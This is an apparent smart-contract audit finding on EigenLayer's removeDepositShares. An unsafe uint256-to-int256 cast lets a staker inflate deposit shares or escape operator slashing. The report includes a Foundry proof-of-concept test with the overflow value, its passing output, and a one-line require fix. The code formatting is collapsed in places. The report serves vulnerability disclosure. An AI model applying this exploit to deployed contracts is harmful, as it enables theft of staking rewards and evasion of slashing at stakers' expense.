

| ID                                                                                                                             | Title                                                                                                                  | Severity |
| ------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------- | -------- |
| [H-01](eigenlayer-contracts.md#h-01-malicious-staker-can-increase-shares-or-bypass-the-operator-slashing-due-to-unsafe-type-casting-inremovedepositshares) | Malicious staker can increase shares or bypass the operator slashing due to unsafe type casting in removeDepositShares | high     |


## [H-01] Malicious staker can increase shares or bypass the operator slashing due to unsafe type casting in removeDepositShares

## Summary

any staker can manipulate his shares in `EigenPodManager` and `DelegationManager` due to an unsafe type casting used in `removeDepostShares` casting from `uint256` to `int256` for a `depositSharesToRemove` that is user inputted value

## Finding Description

`removeDepositShares` is called from `DelegationManager::_removeSharesAndQueueWithdrawal` that is called from `queueWithdrawals` to queue a withdrawals

```
File: DelegationManager.sol180:     function queueWithdrawals(181:         QueuedWithdrawalParams[] calldata params//     CODE195:             withdrawalRoots[i] = _removeSharesAndQueueWithdrawal({196:                 staker: msg.sender,197:                 operator: operator,198:                 strategies: params[i].strategies,199:@>               depositSharesToWithdraw: params[i].depositShares,200:                 slashingFactors: slashingFactors201:             });202:         }
```

Values in `QueuedWithdrawalParams` is

```
struct QueuedWithdrawalParams {        IStrategy[] strategies;@>      uint256[] depositShares;        address __deprecated_withdrawer;    }
```

The staker can specify a value of the shares he want to withdraw with value > `int256` to make an overflow in the `EigenPodManager` as the value is casted to int256 which will overflow silently

```
File: DelegationManager.sol501:             // Remove deposit shares from EigenPodManager/StrategyManager502:             uint256 sharesAfter = shareManager.removeDepositShares(staker, strategies[i], depositSharesToWithdraw[i]);503:
```

for this to be successful a user has to be delegated to an operator with slahsingfactor = 0 to reflect 0 when calculating decrease delegation

```
File: DelegationManager.sol493:                 _decreaseDelegation({494:                     operator: operator,495:                     staker: staker,496:                     strategy: strategies[i],497:                     sharesToDecrease: withdrawableShares[i]498:                 });499:             }
```

or he might not be delegated to any operator

## Impact Explanation

high : a user can

1. escape slashing.
2. stake initial 32 ether then withdrew them and increase his shares to gain huge rewards risk free.

## Proof of Concept

1. Add this function in `EigenPodManagerUnitTests_ShareUpdateTests` contract in `EigenPodManagerUint.t.sol` file
2. run the following command `forge test --mt test_removeShares_OverFlow_manipulate_Shares -vvvv`

```
function test_removeShares_OverFlow_manipulate_Shares() public {
        uint256 sharesAdded = 1 ether;//assume initial shares        uint256 sharesRemoved = 0.5 ether;//shares to be removed 1st        // Initialize pod with shares        _initializePodWithShares(defaultStaker, int(sharesAdded));        // this reflect the value of `podOwnerDepositShares` before withdraw        uint256 balanceBefore = eigenPodManager.stakerDepositShares(defaultStaker, beaconChainETHStrategy);        // Remove shares        cheats.prank(address(delegationManagerMock));        eigenPodManager.removeDepositShares(defaultStaker, beaconChainETHStrategy, sharesRemoved);                // this reflect the value of `podOwnerDepositShares` after partial withdraw        uint256 balanceAfter = eigenPodManager.stakerDepositShares(defaultStaker, beaconChainETHStrategy);
        // Check that balance decreases which is the normal case        assertGt(            balanceBefore, balanceAfter, "Incorrect number of shares removed"        );

        // now mkaing the overflow edgecase        uint256 overFlow_amount = 57896044618658097811785492504343953926634992332820282019728792003956564819968;//int256.max + any value due to overflow would result in increase instead of decrease                        cheats.prank(address(delegationManagerMock));        eigenPodManager.removeDepositShares(defaultStaker, beaconChainETHStrategy, overFlow_amount);                // this reflect the value of `podOwnerDepositShares` overflow edgecase withdraw        uint256 balanceAfterOverflow = eigenPodManager.stakerDepositShares(defaultStaker, beaconChainETHStrategy);
        // asserting that instead of `podOwnerDepositShares` to decrease it increases.        assertGt(balanceAfterOverflow, balanceAfter);    }
```

output

```
VM::assertGt(57896044618658097611785492504343953926634992332820282019729292003956564819968 [5.789e76], 500000000000000000 [5e17]) [staticcall]    │   └─ ← [Return]    └─ ← [Stop]
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.48ms (402.39µs CPU time)
```

As can be seen `podOwnerDepositShares` after withdrawal increased instead of decreasing

## Recommendation

apply this in `removeDepositShares`

```
++    require(int256(depositSharesToRemove) > 0, SharesNegative());
```
